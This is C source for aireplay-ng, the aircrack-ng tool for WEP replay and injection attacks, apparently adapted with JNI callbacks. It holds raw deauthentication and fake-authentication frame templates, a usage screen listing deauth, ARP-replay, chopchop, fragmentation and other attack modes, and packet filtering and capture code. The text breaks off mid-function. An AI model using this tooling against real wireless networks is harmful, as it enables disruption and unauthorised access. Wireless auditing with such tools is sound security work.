/*
 *  802.11 WEP replay & injection attacks
 *
 *  Copyright (C) 2006-2016 Thomas d'Otreppe <tdotreppe@aircrack-ng.org>
 *  Copyright (C) 2004, 2005 Christophe Devine
 *
 *  WEP decryption attack (chopchop) developed by KoreK
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 *
 *
 *  In addition, as a special exception, the copyright holders give
 *  permission to link the code of portions of this program with the
 *  OpenSSL library under certain conditions as described in each
 *  individual source file, and distribute linked combinations
 *  including the two.
 *  You must obey the GNU General Public License in all respects
 *  for all of the code used other than OpenSSL. *  If you modify
 *  file(s) with this exception, you may extend this exception to your
 *  version of the file(s), but you are not obligated to do so. *  If you
 *  do not wish to do so, delete this exception statement from your
 *  version. *  If you delete this exception statement from all source
 *  files in the program, then also delete it here.
 */

#if defined(linux)
    #include <linux/rtc.h>
#endif

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/time.h>

#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <dirent.h>
#include <signal.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <time.h>
#include <getopt.h>
#include <assert.h>

#include <fcntl.h>
#include <ctype.h>

#include <limits.h>

#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include <jni.h>

#include "version.h"
#include "pcap.h"
#include "osdep/osdep.h"
#include "crypto.h"
#include "common.h"
#include "myfakeauth.h"

#define RTC_RESOLUTION  8192

#define REQUESTS    30
#define MAX_APS     20

#define NEW_IV  1
#define RETRY   2
#define ABORT   3

#define UPDATE_ERROR 1
#define UPDATE_SUCCESS 2
#define UPDATE_RUNNING 3

#define DEAUTH_REQ      \
    "\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB" \
    "\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00"

#define AUTH_REQ        \
    "\xB0\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC" \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xB0\x00\x00\x00\x01\x00\x00\x00"

#define ASSOC_REQ       \
    "\x00\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"  \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xC0\x00\x31\x04\x64\x00"

#define REASSOC_REQ       \
    "\x20\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"  \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xC0\x00\x31\x04\x64\x00\x00\x00\x00\x00\x00\x00"

#define NULL_DATA       \
    "\x48\x01\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"  \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xE0\x1B"

#define RTS             \
    "\xB4\x00\x4E\x04\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"

#define RATES           \
    "\x01\x04\x02\x04\x0B\x16\x32\x08\x0C\x12\x18\x24\x30\x48\x60\x6C"

#define PROBE_REQ       \
    "\x40\x00\x00\x00\xFF\xFF\xFF\xFF\xFF\xFF\xCC\xCC\xCC\xCC\xCC\xCC"  \
    "\xFF\xFF\xFF\xFF\xFF\xFF\x00\x00"

#define RATE_NUM 12

#define RATE_1M 1000000
#define RATE_2M 2000000
#define RATE_5_5M 5500000
#define RATE_11M 11000000

#define RATE_6M 6000000
#define RATE_9M 9000000
#define RATE_12M 12000000
#define RATE_18M 18000000
#define RATE_24M 24000000
#define RATE_36M 36000000
#define RATE_48M 48000000
#define RATE_54M 54000000

int bitrates[RATE_NUM]={RATE_1M, RATE_2M, RATE_5_5M, RATE_6M, RATE_9M, RATE_11M, RATE_12M, RATE_18M, RATE_24M, RATE_36M, RATE_48M, RATE_54M};

extern char * getVersion(char * progname, int maj, int min, int submin, int svnrev, int beta, int rc);
extern int maccmp(unsigned char *mac1, unsigned char *mac2);
extern unsigned char * getmac(char * macAddress, int strict, unsigned char * mac);
extern int check_crc_buf( unsigned char *buf, int len );
extern const unsigned long int crc_tbl[256];
extern const unsigned char crc_chop_tbl[256][4];

char info_buffer[1024];
char usage[] =

"\n"
"  %s - (C) 2006-2015 Thomas d\'Otreppe\n"
"  http://www.aircrack-ng.org\n"
"\n"
"  usage: aireplay-ng <options> <replay interface>\n"
"\n"
"  Filter options:\n"
"\n"
"      -b bssid  : MAC address, Access Point\n"
"      -d dmac   : MAC address, Destination\n"
"      -s smac   : MAC address, Source\n"
"      -m len    : minimum packet length\n"
"      -n len    : maximum packet length\n"
"      -u type   : frame control, type    field\n"
"      -v subt   : frame control, subtype field\n"
"      -t tods   : frame control, To      DS bit\n"
"      -f fromds : frame control, From    DS bit\n"
"      -w iswep  : frame control, WEP     bit\n"
"      -D        : disable AP detection\n"
"\n"
"  Replay options:\n"
"\n"
"      -x nbpps  : number of packets per second\n"
"      -p fctrl  : set frame control word (hex)\n"
"      -a bssid  : set Access Point MAC address\n"
"      -c dmac   : set Destination  MAC address\n"
"      -h smac   : set Source       MAC address\n"
"      -g value  : change ring buffer size (default: 8)\n"
"      -F        : choose first matching packet\n"
"\n"
"      Fakeauth attack options:\n"
"\n"
"      -e essid  : set target AP SSID\n"
"      -o npckts : number of packets per burst (0=auto, default: 1)\n"
"      -q sec    : seconds between keep-alives\n"
"      -Q        : send reassociation requests\n"
"      -y prga   : keystream for shared key auth\n"
"      -T n      : exit after retry fake auth request n time\n"
"\n"
"      Arp Replay attack options:\n"
"\n"
"      -j        : inject FromDS packets\n"
"\n"
"      Fragmentation attack options:\n"
"\n"
"      -k IP     : set destination IP in fragments\n"
"      -l IP     : set source IP in fragments\n"
"\n"
"      Test attack options:\n"
"\n"
"      -B        : activates the bitrate test\n"
"\n"
/*
"  WIDS evasion options:\n"
"      -y value  : Use packets older than n packets\n"
"      -z        : Ghosting\n"
"\n"
*/
"  Source options:\n"
"\n"
"      -i iface  : capture packets from this interface\n"
"      -r file   : extract packets from this pcap file\n"
"\n"
"  Miscellaneous options:\n"
"\n"
"      -R                    : disable /dev/rtc usage\n"
"      --ignore-negative-one : if the interface's channel can't be determined,\n"
"                              ignore the mismatch, needed for unpatched cfg80211\n"
"\n"
"  Attack modes (numbers can still be used):\n"
"\n"
"      --deauth      count : deauthenticate 1 or all stations (-0)\n"
"      --fakeauth    delay : fake authentication with AP (-1)\n"
"      --interactive       : interactive frame selection (-2)\n"
"      --arpreplay         : standard ARP-request replay (-3)\n"
"      --chopchop          : decrypt/chopchop WEP packet (-4)\n"
"      --fragment          : generates valid keystream   (-5)\n"
"      --caffe-latte       : query a client for new IVs  (-6)\n"
"      --cfrag             : fragments against a client  (-7)\n"
"      --migmode           : attacks WPA migration mode  (-8)\n"
"      --test              : tests injection and quality (-9)\n"
"\n"
"      --help              : Displays this usage screen\n"
"\n";


struct options
{
    unsigned char f_bssid[6];
    unsigned char f_dmac[6];
    unsigned char f_smac[6];
    int f_minlen;
    int f_maxlen;
    int f_type;
    int f_subtype;
    int f_tods;
    int f_fromds;
    int f_iswep;

    int r_nbpps;
    int r_fctrl;
    unsigned char r_bssid[6];
    unsigned char r_dmac[6];
    unsigned char r_smac[6];
    unsigned char r_dip[4];
    unsigned char r_sip[4];
    char r_essid[33];
    int r_fromdsinj;
    char r_smac_set;

    char ip_out[16];    //16 for 15 chars + \x00
    char ip_in[16];
    int port_out;
    int port_in;

    char *iface_out;
    char *s_face;
    char *s_file;
    unsigned char *prga;

    int a_mode;
    int a_count;
    int a_delay;
	int f_retry;

    int ringbuffer;
    int ghost;
    int prgalen;

    int delay;
    int npackets;

    int fast;
    int bittest;

    int nodetect;
    int ignore_negative_one;
    int rtc;

    int reassoc;
}
opt;

struct devices
{
    int fd_in,  arptype_in;
    int fd_out, arptype_out;
    int fd_rtc;

    unsigned char mac_in[6];
    unsigned char mac_out[6];

    int is_wlanng;
    int is_hostap;
    int is_madwifi;
    int is_madwifing;
    int is_bcm43xx;

    FILE *f_cap_in;

    struct pcap_file_header pfh_in;
}
dev;

static struct wif *_wi_in, *_wi_out;

struct ARP_req
{
    unsigned char *buf;
    int hdrlen;
    int len;
};

struct APt
{
    unsigned char set;
    unsigned char found;
    unsigned char len;
    unsigned char essid[255];
    unsigned char bssid[6];
    unsigned char chan;
    unsigned int  ping[REQUESTS];
    int  pwr[REQUESTS];
};

struct APt ap[MAX_APS];

unsigned long nb_pkt_sent;
unsigned char h80211[4096];
unsigned char tmpbuf[4096];
unsigned char srcbuf[4096];
char strbuf[512];

unsigned char ska_auth1[]     = "\xb0\x00\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                        "\x00\x00\x00\x00\x00\x00\xb0\x01\x01\x00\x01\x00\x00\x00";

unsigned char ska_auth3[4096] = "\xb0\x40\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                        "\x00\x00\x00\x00\x00\x00\xc0\x01";


int ctrl_c, alarmed;

char * iwpriv;

JNIEnv *cb_jnienv;
jobject cb_obj;
jmethodID cb_mid;
int cb_id;
int stop_att = 0;

void info_message(char* mes, int reason) {
    jstring jmes, jid;
    
    

    jmes = (*cb_jnienv)->NewStringUTF(cb_jnienv, mes);
    
    (*cb_jnienv)->CallVoidMethod(cb_jnienv, cb_obj, cb_mid, jmes, (jint) reason, (jint) cb_id);

    (*cb_jnienv)->DeleteLocalRef(cb_jnienv, jmes);
}

void sighandler( int signum )
{
    if( signum == SIGINT )
        ctrl_c++;

    if( signum == SIGALRM )
        alarmed++;
}



int send_packet(void *buf, size_t count)
{
	struct wif *wi = _wi_out; /* XXX globals suck */
	unsigned char *pkt = (unsigned char*) buf;

	if( (count > 24) && (pkt[1] & 0x04) == 0 && (pkt[22] & 0x0F) == 0)
	{
		pkt[22] = (nb_pkt_sent & 0x0000000F) << 4;
		pkt[23] = (nb_pkt_sent & 0x00000FF0) >> 4;
	}

	if (wi_write(wi, buf, count, NULL) == -1) {
		switch (errno) {
		case EAGAIN:
		case ENOBUFS:
			usleep(10000);
			return 0; /* XXX not sure I like this... -sorbo */
		}

		perror("wi_write()");
		return -1;
	}

	nb_pkt_sent++;
	return 0;
}

int read_packet(void *buf, size_t count, struct rx_info *ri)
{
	struct wif *wi = _wi_in; /* XXX */
	int rc;

        rc = wi_read(wi, buf, count, ri);
        if (rc == -1) {
            switch (errno) {
            case EAGAIN:
                    return 0;
            }

            perror("wi_read()");
            return -1;
        }

	return rc;
}

void read_sleep( unsigned long usec )
{
    struct timeval tv, tv2, tv3;
    int caplen;
    fd_set rfds;

    gettimeofday(&tv, NULL);
    gettimeofday(&tv2, NULL);

    tv3.tv_sec=0;
    tv3.tv_usec=10000;

    while( ((tv2.tv_sec*1000000UL - tv.tv_sec*1000000UL) + (tv2.tv_usec - tv.tv_usec)) < (usec) )
    {
        FD_ZERO( &rfds );
        FD_SET( dev.fd_in, &rfds );

        if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv3 ) < 0 )
        {
            continue;
        }

        if( FD_ISSET( dev.fd_in, &rfds ) )
            caplen = read_packet( h80211, sizeof( h80211 ), NULL );

        gettimeofday(&tv2, NULL);
    }
}


int filter_packet( unsigned char *h80211, int caplen )
{
    int z, mi_b, mi_s, mi_d, ext=0, qos;

    if(caplen <= 0)
        return( 1 );

    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
    if ( ( h80211[0] & 0x80 ) == 0x80 )
    {
        qos = 1; /* 802.11e QoS */
        z+=2;
    }

    if( (h80211[0] & 0x0C) == 0x08)    //if data packet
        ext = z-24; //how many bytes longer than default ieee80211 header

    /* check length */
    if( caplen-ext < opt.f_minlen ||
        caplen-ext > opt.f_maxlen ) return( 1 );

    /* check the frame control bytes */

    if( ( h80211[0] & 0x0C ) != ( opt.f_type    << 2 ) &&
        opt.f_type    >= 0 ) return( 1 );

    if( ( h80211[0] & 0x70 ) != (( opt.f_subtype << 4 ) & 0x70) && //ignore the leading bit (QoS)
        opt.f_subtype >= 0 ) return( 1 );

    if( ( h80211[1] & 0x01 ) != ( opt.f_tods         ) &&
        opt.f_tods    >= 0 ) return( 1 );

    if( ( h80211[1] & 0x02 ) != ( opt.f_fromds  << 1 ) &&
        opt.f_fromds  >= 0 ) return( 1 );

    if( ( h80211[1] & 0x40 ) != ( opt.f_iswep   << 6 ) &&
        opt.f_iswep   >= 0 ) return( 1 );

    /* check the extended IV (TKIP) flag */

    if( opt.f_type == 2 && opt.f_iswep == 1 &&
        ( h80211[z + 3] & 0x20 ) != 0 ) return( 1 );

    /* MAC address checking */

    switch( h80211[1] & 3 )
    {
        case  0: mi_b = 16; mi_s = 10; mi_d =  4; break;
        case  1: mi_b =  4; mi_s = 10; mi_d = 16; break;
        case  2: mi_b = 10; mi_s = 16; mi_d =  4; break;
        default: mi_b = 10; mi_d = 16; mi_s = 24; break;
    }

    if( memcmp( opt.f_bssid, NULL_MAC, 6 ) != 0 )
        if( memcmp( h80211 + mi_b, opt.f_bssid, 6 ) != 0 )
            return( 1 );

    if( memcmp( opt.f_smac,  NULL_MAC, 6 ) != 0 )
        if( memcmp( h80211 + mi_s,  opt.f_smac,  6 ) != 0 )
            return( 1 );

    if( memcmp( opt.f_dmac,  NULL_MAC, 6 ) != 0 )
        if( memcmp( h80211 + mi_d,  opt.f_dmac,  6 ) != 0 )
            return( 1 );

    /* this one looks good */

    return( 0 );
}

int wait_for_beacon(unsigned char *bssid, unsigned char *capa, char *essid)
{
    int len = 0, chan = 0, taglen = 0, tagtype = 0, pos = 0;
    unsigned char pkt_sniff[4096];
    struct timeval tv,tv2;
    char essid2[33];

    gettimeofday(&tv, NULL);
    while (1)
    {
        len = 0;
        while (len < 22)
        {
            len = read_packet(pkt_sniff, sizeof(pkt_sniff), NULL);

            gettimeofday(&tv2, NULL);
            if(((tv2.tv_sec-tv.tv_sec)*1000000UL) + (tv2.tv_usec-tv.tv_usec) > 10000*1000) //wait 10sec for beacon frame
            {
                return -1;
            }
            if(len <= 0) usleep(1);
        }
        if (! memcmp(pkt_sniff, "\x80", 1))
        {
            pos = 0;
            taglen = 22;    //initial value to get the fixed tags parsing started
            taglen+= 12;    //skip fixed tags in frames
            do
            {
                pos    += taglen + 2;
                tagtype = pkt_sniff[pos];
                taglen  = pkt_sniff[pos+1];
            } while(tagtype != 3 && pos < len-2);

            if(tagtype != 3) continue;
            if(taglen != 1) continue;
            if(pos+2+taglen > len) continue;

            chan = pkt_sniff[pos+2];

            if(essid)
            {
                pos = 0;
                taglen = 22;    //initial value to get the fixed tags parsing started
                taglen+= 12;    //skip fixed tags in frames
                do
                {
                    pos    += taglen + 2;
                    tagtype = pkt_sniff[pos];
                    taglen  = pkt_sniff[pos+1];
                } while(tagtype != 0 && pos < len-2);

                if(tagtype != 0) continue;
                if(taglen <= 1)
                {
                    if (memcmp(bssid, pkt_sniff+10, 6) == 0) break;
                    else continue;
                }
                if(pos+2+taglen > len) continue;

                if(taglen > 32)taglen = 32;

                if((pkt_sniff+pos+2)[0] < 32 && memcmp(bssid, pkt_sniff+10, 6) == 0)
                {
                    break;
                }

                /* if bssid is given, copy essid */
                if(bssid != NULL && memcmp(bssid, pkt_sniff+10, 6) == 0 && strlen(essid) == 0)
                {
                    memset(essid, 0, 33);
                    memcpy(essid, pkt_sniff+pos+2, taglen);
                    break;
                }

                /* if essid is given, copy bssid AND essid, so we can handle case insensitive arguments */
                if(bssid != NULL && memcmp(bssid, NULL_MAC, 6) == 0 && strncasecmp(essid, (char*)pkt_sniff+pos+2, taglen) == 0 && strlen(essid) == (unsigned)taglen)
                {
                    memset(essid, 0, 33);
                    memcpy(essid, pkt_sniff+pos+2, taglen);
                    memcpy(bssid, pkt_sniff+10, 6);
                    printf("Found BSSID \"%02X:%02X:%02X:%02X:%02X:%02X\" to given ESSID \"%s\".\n", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], essid);
                    snprintf(info_buffer, sizeof(info_buffer), "Found BSSID \"%02X:%02X:%02X:%02X:%02X:%02X\" to given ESSID \"%s\".\n", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], essid);
                        info_message(info_buffer, UPDATE_SUCCESS);
                    break;
                }

                /* if essid and bssid are given, check both */
                if(bssid != NULL && memcmp(bssid, pkt_sniff+10, 6) == 0 && strlen(essid) > 0)
                {
                    memset(essid2, 0, 33);
                    memcpy(essid2, pkt_sniff+pos+2, taglen);
                    if(strncasecmp(essid, essid2, taglen) == 0 && strlen(essid) == (unsigned)taglen)
                        break;
                    else
                    {
                        printf("For the given BSSID \"%02X:%02X:%02X:%02X:%02X:%02X\", there is an ESSID mismatch!\n", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
                        snprintf(info_buffer, sizeof(info_buffer), "For the given BSSID \"%02X:%02X:%02X:%02X:%02X:%02X\", there is an ESSID mismatch!\n", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
                        info_message(info_buffer, UPDATE_ERROR);

                        printf("Found ESSID \"%s\" vs. specified ESSID \"%s\"\n", essid2, essid);
                        snprintf(info_buffer, sizeof(info_buffer), "Found ESSID \"%s\" vs. specified ESSID \"%s\"\n", essid2, essid);
                        info_message(info_buffer, UPDATE_ERROR);

                        printf("Using the given one, double check it to be sure its correct!\n");
                        snprintf(info_buffer, sizeof(info_buffer), "Using the given one, double check it to be sure its correct!\n");
                        info_message(info_buffer, UPDATE_ERROR);
                        break;
                    }
                }
            }
        }
    }

    if(capa) memcpy(capa, pkt_sniff+34, 2);

    return chan;
}

/**
    if bssid != NULL its looking for a beacon frame
*/
int attack_check(unsigned char* bssid, char* essid, unsigned char* capa, struct wif *wi)
{
    int ap_chan=0, iface_chan=0;

    iface_chan = wi_get_channel(wi);

    if(iface_chan == -1 && !opt.ignore_negative_one)
    {
        PCT; printf("Couldn't determine current channel for %s, you should either force the operation with --ignore-negative-one or apply a kernel patch\n",
                wi_get_ifname(wi));
        snprintf(info_buffer, sizeof(info_buffer), "Couldn't determine current channel for %s, you should either force the operation with --ignore-negative-one or apply a kernel patch\n",
                wi_get_ifname(wi));
            info_message(info_buffer, UPDATE_ERROR);
        return -1;
    }

    if(bssid != NULL)
    {
        ap_chan = wait_for_beacon(bssid, capa, essid);
        if(ap_chan < 0)
        {
            PCT; printf("No such BSSID available.\n");
            snprintf(info_buffer, sizeof(info_buffer), "No such BSSID available.\n");
            info_message(info_buffer, UPDATE_ERROR);
            return -1;
        }
        if((ap_chan != iface_chan) && (iface_chan != -1 || !opt.ignore_negative_one))
        {
            PCT; printf("%s is on channel %d, but the AP uses channel %d\n", wi_get_ifname(wi), iface_chan, ap_chan);
            snprintf(info_buffer, sizeof(info_buffer), "%s is on channel %d, but the AP uses channel %d\n", wi_get_ifname(wi), iface_chan, ap_chan);
            info_message(info_buffer, UPDATE_ERROR);
            return -1;
        }
    }

    return 0;
}

int getnet( unsigned char* capa, int filter, int force)
{
    unsigned char *bssid;

    if(opt.nodetect)
        return 0;

    if(filter)
        bssid = opt.f_bssid;
    else
        bssid = opt.r_bssid;


    if( memcmp(bssid, NULL_MAC, 6) )
    {
        PCT; printf("Waiting for beacon frame (BSSID: %02X:%02X:%02X:%02X:%02X:%02X) on channel %d \n",
                    bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],wi_get_channel(_wi_in));
         snprintf(info_buffer, sizeof(info_buffer), "Waiting for beacon frame (BSSID: %02X:%02X:%02X:%02X:%02X:%02X) on channel %d \n",
                    bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],wi_get_channel(_wi_in) );
        info_message(info_buffer, UPDATE_RUNNING);
    }
    else if(strlen(opt.r_essid) > 0)
    {
        PCT; printf("Waiting for beacon frame (ESSID: %s) on channel %d\n", opt.r_essid,wi_get_channel(_wi_in));
         snprintf(info_buffer, sizeof(info_buffer), "Waiting for beacon frame (ESSID: %s) on channel %d\n", opt.r_essid,wi_get_channel(_wi_in));
        info_message(info_buffer, UPDATE_RUNNING);
    }
    else if(force)
    {
        PCT;
        if(filter)
        {
            printf("Please specify at least a BSSID (-b) or an ESSID (-e)\n");
            snprintf(info_buffer, sizeof(info_buffer), "Please specify at least a BSSID (-b) or an ESSID (-e)\n");
            info_message(info_buffer, UPDATE_ERROR);
        }
        else
        {
            printf("Please specify at least a BSSID (-a) or an ESSID (-e)\n");
            snprintf(info_buffer, sizeof(info_buffer), "Please specify at least a BSSID (-a) or an ESSID (-e)\n" );
            info_message(info_buffer, UPDATE_ERROR);
        }
        return( 1 );
    }
    else
        return 0;

    if( attack_check(bssid, opt.r_essid, capa, _wi_in) != 0)
    {
        if(memcmp(bssid, NULL_MAC, 6))
        {
            if( strlen(opt.r_essid) == 0 || opt.r_essid[0] < 32)
            {
                printf( "Please specify an ESSID (-e).\n" );
                snprintf(info_buffer, sizeof(info_buffer), "Please specify a source MAC (-h).\n" );
                info_message(info_buffer, UPDATE_ERROR);
            }
        }

        if(!memcmp(bssid, NULL_MAC, 6))
        {
            if(strlen(opt.r_essid) > 0)
            {
                printf( "Please specify a BSSID (-a).\n" );
                snprintf(info_buffer, sizeof(info_buffer), "Please specify a source MAC (-h).\n" );
                info_message(info_buffer, UPDATE_ERROR);
            }
        }
        return( 1 );
    }

    return 0;
}

int xor_keystream(unsigned char *ph80211, unsigned char *keystream, int len)
{
    int i=0;

    for (i=0; i<len; i++) {
        ph80211[i] = ph80211[i] ^ keystream[i];
    }

    return 0;
}

int capture_ask_packet( int *caplen, int just_grab )
{
    time_t tr;
    struct timeval tv;
    struct tm *lt;

    fd_set rfds;
    long nb_pkt_read;
    int i, j, n, mi_b=0, mi_s=0, mi_d=0, mi_t=0, mi_r=0, is_wds=0, key_index_offset;
    int ret, z;

    FILE *f_cap_out;
    struct pcap_file_header pfh_out;
    struct pcap_pkthdr pkh;

    if( opt.f_minlen  < 0 ) opt.f_minlen  =   40;
    if( opt.f_maxlen  < 0 ) opt.f_maxlen  = 1500;
    if( opt.f_type    < 0 ) opt.f_type    =    2;
    if( opt.f_subtype < 0 ) opt.f_subtype =    0;
    if( opt.f_iswep   < 0 ) opt.f_iswep   =    1;

    tr = time( NULL );

    nb_pkt_read = 0;

    signal( SIGINT, SIG_DFL );

    while( 1 )
    {
        if( time( NULL ) - tr > 0 )
        {
            tr = time( NULL );
            printf( "\rRead %ld packets...\r", nb_pkt_read );
            fflush( stdout );
        }

        if( opt.s_file == NULL )
        {
            FD_ZERO( &rfds );
            FD_SET( dev.fd_in, &rfds );

            tv.tv_sec  = 1;
            tv.tv_usec = 0;

            if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv ) < 0 )
            {
                if( errno == EINTR ) continue;
                perror( "select failed" );
                return( 1 );
            }

            if( ! FD_ISSET( dev.fd_in, &rfds ) )
                continue;

            gettimeofday( &tv, NULL );

            *caplen = read_packet( h80211, sizeof( h80211 ), NULL );

            if( *caplen  < 0 ) return( 1 );
            if( *caplen == 0 ) continue;
        }
        else
        {
            /* there are no hidden backdoors in this source code */

            n = sizeof( pkh );

            if( fread( &pkh, n, 1, dev.f_cap_in ) != 1 )
            {
                printf( "\r\33[KEnd of file.\n" );
                return( 1 );
            }

            if( dev.pfh_in.magic == TCPDUMP_CIGAM ) {
                SWAP32( pkh.caplen );
                SWAP32( pkh.len );
            }

            tv.tv_sec  = pkh.tv_sec;
            tv.tv_usec = pkh.tv_usec;

            n = *caplen = pkh.caplen;

            if( n <= 0 || n > (int) sizeof( h80211 ) || n > (int) sizeof( tmpbuf ) )
            {
                printf( "\r\33[KInvalid packet length %d.\n", n );
                return( 1 );
            }

            if( fread( h80211, n, 1, dev.f_cap_in ) != 1 )
            {
                printf( "\r\33[KEnd of file.\n" );
                return( 1 );
            }

            if( dev.pfh_in.linktype == LINKTYPE_PRISM_HEADER )
            {
                /* remove the prism header */

                if( h80211[7] == 0x40 )
                    n = 64;
                else
                    n = *(int *)( h80211 + 4 );

                if( n < 8 || n >= (int) *caplen )
                    continue;

                memcpy( tmpbuf, h80211, *caplen );
                *caplen -= n;
                memcpy( h80211, tmpbuf + n, *caplen );
            }

            if( dev.pfh_in.linktype == LINKTYPE_RADIOTAP_HDR )
            {
                /* remove the radiotap header */

                n = *(unsigned short *)( h80211 + 2 );

                if( n <= 0 || n >= (int) *caplen )
                    continue;

                memcpy( tmpbuf, h80211, *caplen );
                *caplen -= n;
                memcpy( h80211, tmpbuf + n, *caplen );
            }

            if( dev.pfh_in.linktype == LINKTYPE_PPI_HDR )
            {
                /* remove the PPI header */

                n = le16_to_cpu(*(unsigned short *)( h80211 + 2));

                if( n <= 0 || n>= (int) *caplen )
                    continue;

                /* for a while Kismet logged broken PPI headers */
                if ( n == 24 && le16_to_cpu(*(unsigned short *)(h80211 + 8)) == 2 )
                    n = 32;

                if( n <= 0 || n>= (int) *caplen )
                    continue;

                memcpy( tmpbuf, h80211, *caplen );
                *caplen -= n;
                memcpy( h80211, tmpbuf + n, *caplen );
            }
        }

        nb_pkt_read++;

        if( filter_packet( h80211, *caplen ) != 0 )
            continue;

        if(opt.fast)
            break;

        z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
        if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */
            z+=2;

        switch( h80211[1] & 3 )
        {
            case  0: mi_b = 16; mi_s = 10; mi_d =  4; is_wds = 0; break;
            case  1: mi_b =  4; mi_s = 10; mi_d = 16; is_wds = 0; break;
            case  2: mi_b = 10; mi_s = 16; mi_d =  4; is_wds = 0; break;
            case  3: mi_t = 10; mi_r =  4; mi_d = 16; mi_s = 24; is_wds = 1; break;  // WDS packet
        }

        printf( "\n\n        Size: %d, FromDS: %d, ToDS: %d",
                *caplen, ( h80211[1] & 2 ) >> 1, ( h80211[1] & 1 ) );

        if( ( h80211[0] & 0x0C ) == 8 && ( h80211[1] & 0x40 ) != 0 )
        {
//             if (is_wds) key_index_offset = 33; // WDS packets have an additional MAC, so the key index is at byte 33
//             else key_index_offset = 27;
            key_index_offset = z+3;

            if( ( h80211[key_index_offset] & 0x20 ) == 0 )
                printf( " (WEP)" );
            else
                printf( " (WPA)" );
        }

        printf( "\n\n" );

        if (is_wds) {
            printf( "        Transmitter  =  %02X:%02X:%02X:%02X:%02X:%02X\n",
                    h80211[mi_t    ], h80211[mi_t + 1],
                    h80211[mi_t + 2], h80211[mi_t + 3],
                    h80211[mi_t + 4], h80211[mi_t + 5] );

            printf( "           Receiver  =  %02X:%02X:%02X:%02X:%02X:%02X\n",
                    h80211[mi_r    ], h80211[mi_r + 1],
                    h80211[mi_r + 2], h80211[mi_r + 3],
                    h80211[mi_r + 4], h80211[mi_r + 5] );
        } else {
            printf( "              BSSID  =  %02X:%02X:%02X:%02X:%02X:%02X\n",
                    h80211[mi_b    ], h80211[mi_b + 1],
                    h80211[mi_b + 2], h80211[mi_b + 3],
                    h80211[mi_b + 4], h80211[mi_b + 5] );
        }

        printf( "          Dest. MAC  =  %02X:%02X:%02X:%02X:%02X:%02X\n",
                h80211[mi_d    ], h80211[mi_d + 1],
                h80211[mi_d + 2], h80211[mi_d + 3],
                h80211[mi_d + 4], h80211[mi_d + 5] );

        printf( "         Source MAC  =  %02X:%02X:%02X:%02X:%02X:%02X\n",
                h80211[mi_s    ], h80211[mi_s + 1],
                h80211[mi_s + 2], h80211[mi_s + 3],
                h80211[mi_s + 4], h80211[mi_s + 5] );

        /* print a hex dump of the packet */

        for( i = 0; i < *caplen; i++ )
        {
            if( ( i & 15 ) == 0 )
            {
                if( i == 224 )
                {
                    printf( "\n        --- CUT ---" );
                    break;
                }

                printf( "\n        0x%04x:  ", i );
            }

            printf( "%02x", h80211[i] );

            if( ( i & 1 ) != 0 )
                printf( " " );

            if( i == *caplen - 1 && ( ( i + 1 ) & 15 ) != 0 )
            {
                for( j = ( ( i + 1 ) & 15 ); j < 16; j++ )
                {
                    printf( "  " );
                    if( ( j & 1 ) != 0 )
                        printf( " " );
                }

                printf( " " );

                for( j = 16 - ( ( i + 1 ) & 15 ); j < 16; j++ )
                    printf( "%c", ( h80211[i - 15 + j] <  32 ||
                                    h80211[i - 15 + j] > 126 )
                                  ? '.' : h80211[i - 15 + j] );
            }

            if( i > 0 && ( ( i + 1 ) & 15 ) == 0 )
            {
                printf( " " );

                for( j = 0; j < 16; j++ )
                    printf( "%c", ( h80211[i - 15 + j] <  32 ||
                                    h80211[i - 15 + j] > 127 )
                                  ? '.' : h80211[i - 15 + j] );
            }
        }

        printf( "\n\nUse this packet ? " );
        fflush( stdout );
        ret=0;
        while(!ret) ret = scanf( "%s", tmpbuf );
        printf( "\n" );

        if( tmpbuf[0] == 'y' || tmpbuf[0] == 'Y' )
            break;
    }

    if(!just_grab)
    {
        pfh_out.magic         = TCPDUMP_MAGIC;
        pfh_out.version_major = PCAP_VERSION_MAJOR;
        pfh_out.version_minor = PCAP_VERSION_MINOR;
        pfh_out.thiszone      = 0;
        pfh_out.sigfigs       = 0;
